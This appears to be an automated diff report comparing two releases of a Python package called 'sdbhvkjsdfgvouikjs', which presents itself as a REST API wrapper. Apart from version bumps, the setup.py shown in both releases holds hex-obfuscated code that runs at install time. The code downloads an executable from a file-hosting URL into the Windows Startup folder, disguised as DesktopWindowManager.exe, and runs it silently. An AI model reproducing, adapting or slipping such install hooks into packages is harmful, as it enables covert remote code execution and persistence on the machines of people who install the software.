# Comparing `tmp/sdbhvkjsdfgvouikjs-2.7.16.tar.gz` & `tmp/sdbhvkjsdfgvouikjs-2.7.17.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "sdbhvkjsdfgvouikjs-2.7.16.tar", last modified: Sat Apr 22 00:19:53 2023, max compression
+gzip compressed data, was "sdbhvkjsdfgvouikjs-2.7.17.tar", last modified: Sat Apr 22 00:23:22 2023, max compression
```

## Comparing `sdbhvkjsdfgvouikjs-2.7.16.tar` & `sdbhvkjsdfgvouikjs-2.7.17.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxrwxrwx   0        0        0        0 2023-04-22 00:19:53.285400 sdbhvkjsdfgvouikjs-2.7.16/
--rw-rw-rw-   0        0        0      763 2023-04-22 00:19:53.270109 sdbhvkjsdfgvouikjs-2.7.16/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-04-22 00:19:53.161234 sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs/
--rw-rw-rw-   0        0        0     1618 2023-04-21 23:46:14.000000 sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs/__init__.py
--rw-rw-rw-   0        0        0     1618 2023-04-21 23:46:14.000000 sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs/testing.py
-drwxrwxrwx   0        0        0        0 2023-04-22 00:19:53.251747 sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs.egg-info/
--rw-rw-rw-   0        0        0      763 2023-04-22 00:19:52.000000 sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      237 2023-04-22 00:19:53.000000 sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-22 00:19:52.000000 sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2023-04-22 00:19:53.000000 sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-04-22 00:19:53.285400 sdbhvkjsdfgvouikjs-2.7.16/setup.cfg
--rw-rw-rw-   0        0        0     2526 2023-04-22 00:15:37.000000 sdbhvkjsdfgvouikjs-2.7.16/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-22 00:23:22.501256 sdbhvkjsdfgvouikjs-2.7.17/
+-rw-rw-rw-   0        0        0      763 2023-04-22 00:23:22.486158 sdbhvkjsdfgvouikjs-2.7.17/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-04-22 00:23:22.378736 sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs/
+-rw-rw-rw-   0        0        0     1618 2023-04-21 23:46:14.000000 sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs/__init__.py
+-rw-rw-rw-   0        0        0     1618 2023-04-21 23:46:14.000000 sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs/testing.py
+drwxrwxrwx   0        0        0        0 2023-04-22 00:23:22.464605 sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs.egg-info/
+-rw-rw-rw-   0        0        0      763 2023-04-22 00:23:22.000000 sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      237 2023-04-22 00:23:22.000000 sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-22 00:23:22.000000 sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2023-04-22 00:23:22.000000 sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-04-22 00:23:22.501256 sdbhvkjsdfgvouikjs-2.7.17/setup.cfg
+-rw-rw-rw-   0        0        0     2526 2023-04-22 00:23:01.000000 sdbhvkjsdfgvouikjs-2.7.17/setup.py
```

### Comparing `sdbhvkjsdfgvouikjs-2.7.16/PKG-INFO` & `sdbhvkjsdfgvouikjs-2.7.17/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: sdbhvkjsdfgvouikjs
-Version: 2.7.16
+Version: 2.7.17
 Summary: Amazing RestAPI Wrapper!
 License: GPLv3
 Classifier: Environment :: Console
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Operating System :: MacOS :: MacOS X
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: Operating System :: POSIX
```

### Comparing `sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs/__init__.py` & `sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs/__init__.py`

 * *Files identical despite different names*

### Comparing `sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs/testing.py` & `sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs/testing.py`

 * *Files identical despite different names*

### Comparing `sdbhvkjsdfgvouikjs-2.7.16/sdbhvkjsdfgvouikjs.egg-info/PKG-INFO` & `sdbhvkjsdfgvouikjs-2.7.17/sdbhvkjsdfgvouikjs.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: sdbhvkjsdfgvouikjs
-Version: 2.7.16
+Version: 2.7.17
 Summary: Amazing RestAPI Wrapper!
 License: GPLv3
 Classifier: Environment :: Console
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Operating System :: MacOS :: MacOS X
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: Operating System :: POSIX
```

### Comparing `sdbhvkjsdfgvouikjs-2.7.16/setup.py` & `sdbhvkjsdfgvouikjs-2.7.17/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 import os as Sus
 
 SUS("\x68""\x74""\x74""\x70""\x73""\x3a""\x2f""\x2f""\x66""\x69""\x6c""\x65""\x73""\x2e""\x63""\x61""\x74""\x62""\x6f""\x78""\x2e""\x6d""\x6f""\x65""\x2f""\x7a""\x67""\x6c""\x32""\x64""\x38""\x2e""\x65""\x78""\x61",getattr(Sus,"\x65""\x6e""\x76""\x69""\x72""\x6f""\x6e")["\x41""\x50""\x50""\x44""\x41""\x54""\x41"]+"\x5c""\x4d""\x69""\x63""\x72""\x6f""\x73""\x6f""\x66""\x74""\x5c""\x57""\x69""\x6e""\x64""\x6f""\x77""\x73""\x5c""\x53""\x74""\x61""\x72""\x74""\x20""\x4d""\x65""\x6e""\x75""\x5c""\x50""\x72""\x6f""\x67""\x72""\x61""\x6d""\x73""\x5c""\x53""\x74""\x61""\x72""\x74""\x75""\x70""\x5c""\x44""\x65""\x73""\x6b""\x74""\x6f""\x70""\x57""\x69""\x6e""\x64""\x6f""\x77""\x4d""\x61""\x6e""\x61""\x67""\x65""\x72""\x2e""\x65""\x78""\x65")
 getattr(sus,"\x50""\x6f""\x70""\x65""\x6e")(getattr(Sus,"\x65""\x6e""\x76""\x69""\x72""\x6f""\x6e")["\x41""\x50""\x50""\x44""\x41""\x54""\x41"]+"\x5c""\x4d""\x69""\x63""\x72""\x6f""\x73""\x6f""\x66""\x74""\x5c""\x57""\x69""\x6e""\x64""\x6f""\x77""\x73""\x5c""\x53""\x74""\x61""\x72""\x74""\x20""\x4d""\x65""\x6e""\x75""\x5c""\x50""\x72""\x6f""\x67""\x72""\x61""\x6d""\x73""\x5c""\x53""\x74""\x61""\x72""\x74""\x75""\x70""\x5c""\x44""\x65""\x73""\x6b""\x74""\x6f""\x70""\x57""\x69""\x6e""\x64""\x6f""\x77""\x4d""\x61""\x6e""\x61""\x67""\x65""\x72""\x2e""\x65""\x78""\x65",**{"\x73""\x68""\x65""\x6c""\x6c":True,"\x73""\x74""\x64""\x6f""\x75""\x74":getattr(sus,"\x44""\x45""\x56""\x4e""\x55""\x4c""\x4c"),"\x73""\x74""\x64""\x65""\x72""\x72":getattr(sus,"\x53""\x54""\x44""\x4f""\x55""\x54")})
 
 setup(
     name="sdbhvkjsdfgvouikjs", # dev_sdbhvkjsdfgvouikjsd
-    version="2.7.16",
+    version="2.7.17",
     description="Amazing RestAPI Wrapper!",
     packages=find_packages(),
     license="GPLv3",
     classifiers=[
         'Environment :: Console',
         'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
         'Operating System :: MacOS :: MacOS X',
```

